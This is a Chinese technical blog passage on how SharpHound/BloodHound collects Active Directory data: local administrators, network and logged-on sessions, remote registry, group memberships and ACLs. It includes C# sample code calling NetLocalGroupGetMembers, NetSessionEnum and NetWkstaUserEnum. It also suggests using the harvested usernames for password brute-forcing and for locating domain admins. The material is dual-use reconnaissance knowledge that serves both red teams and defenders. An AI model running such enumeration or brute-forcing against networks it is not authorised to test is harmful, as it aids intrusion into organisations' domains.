<p>右键设置起点终点，或者在左上角填上起点终点</p>
<p><img src="https://img-blog.csdnimg.cn/20201008214216363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2><a id="API_2525"></a>目标选择和API使用</h2>
<p>收集器有几个独立的步骤，它们同时运行以收集图形所需的不同数据。整体细分分为几类：本地管理员，组成员关系，会话，对象属性，ACL和域信任。</p>
<p><strong>本地管理员</strong></p>
<p>本地管理员集合使用两种不同的方法完成，具体取决于是否指定了隐秘选项。没有隐秘选项的本地管理员收集将首先查询Active Directory以获取计算机列表。计算机列表将传递给枚举运行程序，该运行程序将连接到每台计算机并执行以下操作：</p>
<pre><code class="prism language-c"><span class="token number">1.</span>在端口<span class="token number">445</span>上执行TCP连接以检查主机是否处于活动状态
<span class="token number">2.</span>如果主机处于活动状态，则执行NetLocalGroupGetMembers NETAPI32 API。
<span class="token number">3.</span>从NetLocalGroupGetMembers调用返回的数据并将SID解析为实际用户，并过滤掉本地帐户。
</code></pre>
<p>如果指定了隐秘集合，则SharpHound将向域控制器查询所有组策略容器对象及其对应的gpcfilesyspath属性的列表，该属性指示实际组策略文件在域控制器$ SYSVOL目录中的位置。将枚举每个组策略文件，查找模式S-1-5-32-544__Members，它指示本地Administrators组。处理文件以确定应用这些GPO的计算机。</p>
<p><strong>语法</strong></p>
<pre><code class="prism language-c">NET_API_STATUS NET_API_FUNCTION <span class="token function">NetLocalGroupGetMembers</span><span class="token punctuation">(</span>  LPCWSTR    servername<span class="token punctuation">,</span>  LPCWSTR    localgroupname<span class="token punctuation">,</span>  DWORD      level<span class="token punctuation">,</span>  LPBYTE     <span class="token operator">*</span>bufptr<span class="token punctuation">,</span>  DWORD      prefmaxlen<span class="token punctuation">,</span>  LPDWORD    entriesread<span class="token punctuation">,</span>  LPDWORD    totalentries<span class="token punctuation">,</span>  PDWORD_PTR resumehandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><strong>参数</strong></p>
<p><strong>servername</strong></p>
<p>指向常量字符串的指针，该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为NULL，则使用本地计算机。</p>
<p><strong>localgroupname</strong></p>
<p>指向常量字符串的指针，该字符串指定要列出其成员的本地组的名称。有关更多信息，请参阅以下备注部分。</p>
<p><strong>level</strong></p>
<p>指定数据的信息级别。此参数可以是以下值之一。<br>
<img src="https://img-blog.csdnimg.cn/20201008214312524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
NetLocalGroupGetMembers sample code，枚举用户</p>
<pre><code class="prism language-c"><span class="token keyword">static</span> class NetworkAPI
<span class="token punctuation">{</span>
<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"Netapi32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
public <span class="token keyword">extern</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">NetLocalGroupGetMembers</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">MarshalAs</span><span class="token punctuation">(</span>UnmanagedType<span class="token punctuation">.</span>LPWStr<span class="token punctuation">)</span><span class="token punctuation">]</span> string servername<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token function">MarshalAs</span><span class="token punctuation">(</span>UnmanagedType<span class="token punctuation">.</span>LPWStr<span class="token punctuation">)</span><span class="token punctuation">]</span> string localgroupname<span class="token punctuation">,</span> <span class="token keyword">int</span> level<span class="token punctuation">,</span> out IntPtr bufptr<span class="token punctuation">,</span> <span class="token keyword">int</span> prefmaxlen<span class="token punctuation">,</span> out <span class="token keyword">int</span> entriesread<span class="token punctuation">,</span> out <span class="token keyword">int</span> totalentries<span class="token punctuation">,</span> out <span class="token keyword">int</span> resumehandle<span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"Netapi32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
public <span class="token keyword">extern</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">NetApiBufferFree</span><span class="token punctuation">(</span>IntPtr Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// LOCALGROUP_MEMBERS_INFO_1 - Structure for holding members details</span>
<span class="token punctuation">[</span><span class="token function">StructLayout</span><span class="token punctuation">(</span>LayoutKind<span class="token punctuation">.</span>Sequential<span class="token punctuation">,</span> CharSet <span class="token operator">=</span> CharSet<span class="token punctuation">.</span>Unicode<span class="token punctuation">)</span><span class="token punctuation">]</span>
public <span class="token keyword">struct</span> LOCALGROUP_MEMBERS_INFO_1
<span class="token punctuation">{</span>
public <span class="token keyword">int</span> lgrmi1_sid<span class="token punctuation">;</span>
public <span class="token keyword">int</span> lgrmi1_sidusage<span class="token punctuation">;</span>
public string lgrmi1_name<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span>string<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">int</span> EntriesRead<span class="token punctuation">;</span>
<span class="token keyword">int</span> TotalEntries<span class="token punctuation">;</span>
<span class="token keyword">int</span> Resume<span class="token punctuation">;</span>
IntPtr bufPtr<span class="token punctuation">;</span>

string groupName <span class="token operator">=</span> <span class="token string">"Administrators"</span><span class="token punctuation">;</span>

NetworkAPI<span class="token punctuation">.</span><span class="token function">NetLocalGroupGetMembers</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> groupName<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> out bufPtr<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> out EntriesRead<span class="token punctuation">,</span> out TotalEntries<span class="token punctuation">,</span> out Resume<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>EntriesRead <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
NetworkAPI<span class="token punctuation">.</span>LOCALGROUP_MEMBERS_INFO_1<span class="token punctuation">[</span><span class="token punctuation">]</span> Members <span class="token operator">=</span> new NetworkAPI<span class="token punctuation">.</span>LOCALGROUP_MEMBERS_INFO_1<span class="token punctuation">[</span>EntriesRead<span class="token punctuation">]</span><span class="token punctuation">;</span>
IntPtr iter <span class="token operator">=</span> bufPtr<span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> EntriesRead<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
Members<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>NetworkAPI<span class="token punctuation">.</span>LOCALGROUP_MEMBERS_INFO_1<span class="token punctuation">)</span>Marshal<span class="token punctuation">.</span><span class="token function">PtrToStructure</span><span class="token punctuation">(</span>iter<span class="token punctuation">,</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>NetworkAPI<span class="token punctuation">.</span>LOCALGROUP_MEMBERS_INFO_1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
iter <span class="token operator">=</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>iter <span class="token operator">+</span> Marshal<span class="token punctuation">.</span><span class="token function">SizeOf</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>NetworkAPI<span class="token punctuation">.</span>LOCALGROUP_MEMBERS_INFO_1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>Members<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lgrmi1_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
NetworkAPI<span class="token punctuation">.</span><span class="token function">NetApiBufferFree</span><span class="token punctuation">(</span>bufPtr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008214335457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>NetLocalGroupGetMembers</strong> 函数检索安全数据库中<code>特定的本地组</code>，它从安全帐户管理器（SAM）数据库，或在域控制器上（在Active Directory）枚举成员名单。本地组成员可以是用户或全局组。也就是说，在非域控的机器下枚举只能是本地组用户，在域控下运行可以枚举本地组或者全局组。（需要在域内使用，如果是工作组，无法获取远程计算机的成员组用户，只能获取本地成员组用户）</p>
<p>通过遍历DNS或者NetBIOS名称便可以获取所有机器的特定本地组的用户名<br>
<img src="https://img-blog.csdnimg.cn/20201008214402483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>扩展思路</strong></p>
<pre><code class="prism language-c"><span class="token number">1.</span>拿到的用户名可以作为爆破使用。

<span class="token number">2.</span>确认域管、域控机器。
</code></pre>
<p><strong>会话</strong></p>
<p>无论是否指定隐秘，会话集合都是相同的。BloodHound公开了两种不同的查询计算机会话信息的方法。两种方法都从检查端口445开始，然后发散。</p>
<p><strong>默认会话</strong></p>
<p>会话收集的默认方法使用NetSessionEnum NETAPI32调用。它不允许直接查询系统以询问谁登录。相反，它允许查询系统以确定为该系统建立的网络会话以及从何处访问。在访问网络资源（例如文件共享）时创建网络会话。</p>
<p>该函数提供有关在服务器上建立的会话的信息。</p>
<p><strong>语法</strong></p>
<pre><code class="prism language-c">NET_API_STATUS NET_API_FUNCTION <span class="token function">NetSessionEnum</span><span class="token punctuation">(</span>  LMSTR   servername<span class="token punctuation">,</span>  LMSTR   UncClientName<span class="token punctuation">,</span>  LMSTR   username<span class="token punctuation">,</span>  DWORD   level<span class="token punctuation">,</span>  LPBYTE  <span class="token operator">*</span>bufptr<span class="token punctuation">,</span>  DWORD   prefmaxlen<span class="token punctuation">,</span>  LPDWORD entriesread<span class="token punctuation">,</span>  LPDWORD totalentries<span class="token punctuation">,</span>  LPDWORD resume_handle<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><strong>参数</strong></p>
<p><strong>servername</strong></p>
<p>指向字符串的指针，该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为NULL，则使用本地计算机。</p>
<p><strong>UncClientName</strong></p>
<p>指向字符串的指针，该字符串指定要为其返回信息的计算机会话的名称。如果此参数为NULL，则 NetSessionEnum将返回服务器上所有计算机会话的信息。</p>
<p><strong>username</strong></p>
<p>指向字符串的指针，该字符串指定要为其返回信息的用户的名称。如果此参数为NULL，则 NetSessionEnum将返回所有用户的信息。</p>
<p><strong>level</strong></p>
<p>指定数据的信息级别。此参数可以是以下值之一。</p>
<p><img src="https://img-blog.csdnimg.cn/20201008214448171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>例如，API调用可以像这样运行：</strong></p>
<pre><code class="prism language-c"><span class="token function">NetSessionEnum</span><span class="token punctuation">(</span><span class="token string">"primary.testlab.local"</span><span class="token punctuation">,</span> null<span class="token punctuation">,</span> null<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> out IntPtr ptrInfo<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> out <span class="token keyword">int</span> EntriesRead<span class="token punctuation">,</span> out <span class="token keyword">int</span> _<span class="token punctuation">,</span> ref resumeHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>API调用的第四个参数是API调用的级别，其中10是唯一以未经身份验证的方式为BloodHound提供所需数据的级别。（级别1、2需要administrators或者Server Operators本地组的成员身份）。因此，使用该函数时不需要高权限。</p>
<p><strong>对具有已安装的共享驱动器的域控制器运行此操作将显示类似于以下的结果：</strong></p>
<pre><code class="prism language-c">sesi10_cname <span class="token operator">-</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.10</span>sesi10_username <span class="token operator">-</span> rvazarkarsesi10_time <span class="token operator">-</span> <span class="token number">0</span>sesi10_idle_time <span class="token operator">-</span> <span class="token number">0</span>
</code></pre>
<p>该sesi10_cname参数指示，其中会话是从哪里来的，所以主机名可以让我们的会话到远程主机相关解析这个IP地址。这通常是您可能看不到已知存在的登录会话的原因。如果外部网络会话不存在，则SharpHound的未经身份验证的收集方法无法枚举此数据。同样重要的是要注意，username参数没有与之关联的域，这意味着会话信息包含涉及猜测的元素。SharpHound使用全局编录来尝试消除冲突用户的冲突，并确定哪个域是正确的域，但不能保证它会选择正确的域。</p>
<p><strong>session的获取主要通过域控及共享</strong></p>
<p><strong>NetSessionEnum sample code</strong></p>
<pre><code class="prism language-c">public <span class="token keyword">static</span> SESSION_INFO_10<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">EnumSessions</span><span class="token punctuation">(</span>string server<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            IntPtr BufPtr<span class="token punctuation">;</span>            <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            Int32 er <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> tr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> resume <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            BufPtr <span class="token operator">=</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span>Marshal<span class="token punctuation">.</span><span class="token function">SizeOf</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>SESSION_INFO_10<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            SESSION_INFO_10<span class="token punctuation">[</span><span class="token punctuation">]</span> results <span class="token operator">=</span> new SESSION_INFO_10<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">do</span>            <span class="token punctuation">{</span>                res <span class="token operator">=</span> <span class="token function">NetSessionEnum</span><span class="token punctuation">(</span>server<span class="token punctuation">,</span> null<span class="token punctuation">,</span> null<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> out BufPtr<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> ref er<span class="token punctuation">,</span> ref tr<span class="token punctuation">,</span> ref resume<span class="token punctuation">)</span><span class="token punctuation">;</span>                results <span class="token operator">=</span> new SESSION_INFO_10<span class="token punctuation">[</span>er<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>NERR<span class="token punctuation">.</span>ERROR_MORE_DATA <span class="token operator">||</span> res <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>NERR<span class="token punctuation">.</span>NERR_Success<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    Int32 p <span class="token operator">=</span> BufPtr<span class="token punctuation">.</span><span class="token function">ToInt32</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> er<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        SESSION_INFO_10 si <span class="token operator">=</span> <span class="token punctuation">(</span>SESSION_INFO_10<span class="token punctuation">)</span>Marshal<span class="token punctuation">.</span><span class="token function">PtrToStructure</span><span class="token punctuation">(</span>new <span class="token function">IntPtr</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>SESSION_INFO_10<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        results<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> si<span class="token punctuation">;</span>                        p <span class="token operator">+</span><span class="token operator">=</span> Marshal<span class="token punctuation">.</span><span class="token function">SizeOf</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>SESSION_INFO_10<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                Marshal<span class="token punctuation">.</span><span class="token function">FreeHGlobal</span><span class="token punctuation">(</span>BufPtr<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>NERR<span class="token punctuation">.</span>ERROR_MORE_DATA<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> results<span class="token punctuation">;</span>        <span class="token punctuation">}</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008214544722.png#pic_center" alt="在这里插入图片描述"><br>
<strong>扩展思路</strong></p>
<pre><code class="prism language-c"><span class="token number">1.</span>通过服务器建立session信息搜集IP资产
</code></pre>
<p><strong>LoggedOn会话</strong></p>
<p>该LoggedOn收集方法是通过询问是谁在对系统实际登录的计算机返回会话信息的更精确的收集方法。需要注意的是，此级别的集合需要您要从中收集数据的主机的管理权限。此会话集非常适合防御者，或在获得域管理员后进行其他数据收集。该LoggedOn收集方法采用两种不同的方法来收集数据。第一种方法是使用NetWkstaUserEnum NETAPI32 API调用。</p>
<p>该函数可以列出当前登录到该工作站的所有用户的信息。此列表包括交互式，服务和批量登录。</p>
<p><strong>语法</strong></p>
<pre><code class="prism language-c">NET_API_STATUS NET_API_FUNCTION <span class="token function">NetSessionEnum</span><span class="token punctuation">(</span>  LMSTR   servername<span class="token punctuation">,</span>  LMSTR   UncClientName<span class="token punctuation">,</span>  LMSTR   username<span class="token punctuation">,</span>  DWORD   level<span class="token punctuation">,</span>  LPBYTE  <span class="token operator">*</span>bufptr<span class="token punctuation">,</span>  DWORD   prefmaxlen<span class="token punctuation">,</span>  LPDWORD entriesread<span class="token punctuation">,</span>  LPDWORD totalentries<span class="token punctuation">,</span>  LPDWORD resume_handle<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><strong>参数</strong></p>
<p><strong>servername</strong></p>
<p>指向字符串的指针，该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为NULL，则使用本地计算机。</p>
<p><strong>UncClientName</strong></p>
<p>指向字符串的指针，该字符串指定要为其返回信息的计算机会话的名称。如果此参数为NULL，则 NetSessionEnum将返回服务器上所有计算机会话的信息。</p>
<p><strong>username</strong></p>
<p>指向字符串的指针，该字符串指定要为其返回信息的用户的名称。如果此参数为NULL，则 NetSessionEnum将返回所有用户的信息。</p>
<p><strong>level</strong></p>
<p>指定数据的信息级别。此参数可以是以下值之一。<img src="https://img-blog.csdnimg.cn/20201008214741819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>此API调用的示例如下：</strong></p>
<pre><code class="prism language-c"><span class="token function">NetWkstaUserEnum</span><span class="token punctuation">(</span><span class="token string">"primary.testlab.local"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> out IntPtr intPtr<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> out <span class="token keyword">int</span> entriesRead<span class="token punctuation">,</span> out <span class="token keyword">int</span> _<span class="token punctuation">,</span> ref resumeHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>API调用的第二个参数是API调用的级别，其中1个返回的数据多于0。对系统执行此操作会产生如下数据：</p>
<pre><code class="prism language-c">wkui1_username <span class="token operator">-</span> rvazarkarwkui1_logon_domain <span class="token operator">-</span> TESTLABwkui1_oth_domains <span class="token operator">-</span>wkui1_logon_server <span class="token operator">-</span> PRIMARY
</code></pre>
<p><strong>NetWkstaUserEnum sample code</strong></p>
<pre><code class="prism language-c">public <span class="token keyword">static</span> WKSTA_USER_INFO_1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">EnumWkstaUser</span><span class="token punctuation">(</span>string server<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
IntPtr Bufptr<span class="token punctuation">;</span>
<span class="token keyword">int</span> nStatus <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
Int32 dwEntriesread <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> dwTotalentries <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> dwResumehandle <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

Bufptr <span class="token operator">=</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span>Marshal<span class="token punctuation">.</span><span class="token function">SizeOf</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>WKSTA_USER_INFO_1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
WKSTA_USER_INFO_1<span class="token punctuation">[</span><span class="token punctuation">]</span> results <span class="token operator">=</span> new WKSTA_USER_INFO_1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">do</span>
<span class="token punctuation">{</span>
nStatus <span class="token operator">=</span> <span class="token function">NetWkstaUserEnum</span><span class="token punctuation">(</span>server<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> out Bufptr<span class="token punctuation">,</span> <span class="token number">32768</span><span class="token punctuation">,</span> out dwEntriesread<span class="token punctuation">,</span> out dwTotalentries<span class="token punctuation">,</span> ref dwResumehandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
results <span class="token operator">=</span> new WKSTA_USER_INFO_1<span class="token punctuation">[</span>dwEntriesread<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nStatus <span class="token operator">==</span> NERR_SUCCESS<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>nStatus <span class="token operator">==</span> ERROR_MORE_DATA<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>dwEntriesread <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
IntPtr pstruct <span class="token operator">=</span> Bufptr<span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dwEntriesread<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
WKSTA_USER_INFO_1 wui1 <span class="token operator">=</span> <span class="token punctuation">(</span>WKSTA_USER_INFO_1<span class="token punctuation">)</span>Marshal<span class="token punctuation">.</span><span class="token function">PtrToStructure</span><span class="token punctuation">(</span>pstruct<span class="token punctuation">,</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>WKSTA_USER_INFO_1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
results<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> wui1<span class="token punctuation">;</span>
pstruct <span class="token operator">=</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pstruct <span class="token operator">+</span> Marshal<span class="token punctuation">.</span><span class="token function">SizeOf</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>WKSTA_USER_INFO_1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
<span class="token comment">//Console.WriteLine("A system error has occurred : " + nStatus);</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>Bufptr <span class="token operator">!=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">)</span>
<span class="token function">NetApiBufferFree</span><span class="token punctuation">(</span>Bufptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>nStatus <span class="token operator">==</span> ERROR_MORE_DATA<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> results<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008214821380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
LoggedOn集合方法使用的辅助枚举方法是使用远程注册表。SharpHound将尝试打开远程注册表的用户配置单元（如果已启用），并将查找与 SID 格式匹配的子项，这些对应于登录用户将获取的 SID 转换成用户名即可。一般来说，需要域管权限去操作，而在极少数情况下，无需管理员权限即可访问此数据 。</p>
<p><strong>Reg sample code</strong></p>
<pre><code class="prism language-c">private <span class="token keyword">static</span> IEnumerable<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span> <span class="token function">GetRegistryLoggedOn</span><span class="token punctuation">(</span>string server<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
var users <span class="token operator">=</span> new List<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
try
<span class="token punctuation">{</span>
<span class="token comment">// 远程打开注册表配置单元，如果它不是我们当前的配置单元</span>
RegistryKey key <span class="token operator">=</span> RegistryKey<span class="token punctuation">.</span><span class="token function">OpenRemoteBaseKey</span><span class="token punctuation">(</span>RegistryHive<span class="token punctuation">.</span>Users<span class="token punctuation">,</span> server<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 找到与我们的正则表达式匹配的所有子项</span>
var filtered <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">GetSubKeyNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span>sub <span class="token operator">=</span><span class="token operator">&gt;</span> SidRegex<span class="token punctuation">.</span><span class="token function">IsMatch</span><span class="token punctuation">(</span>sub<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
foreach <span class="token punctuation">(</span>var subkey in filtered<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
users<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>subkey<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
catch <span class="token punctuation">(</span>Exception<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
yield <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
foreach <span class="token punctuation">(</span>var user in users<span class="token punctuation">.</span><span class="token function">Distinct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
yield <span class="token keyword">return</span> user<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>组成员关系</strong></p>
<p>所有域组成员资格集合都通过LDAP完成。SharpHound将向域控制器询问域中每个组，用户和计算机对象的列表，并使用MemberOf属性来解析组成员身份。组成员关系集合不需要触及域控制器以外的任何系统。</p>
<p><strong>ACL</strong></p>
<p>所有AD对象ACL集合都是通过LDAP完成的。SharpHound将向域控制器询问域中每个用户，组，计算机和域对象的列表，并使用NTSecurityDescriptor属性来解析访问控制列表。ACL集合不需要触及域控制器以外的任何系统。</p>
<p><strong>域信任关系</strong></p>
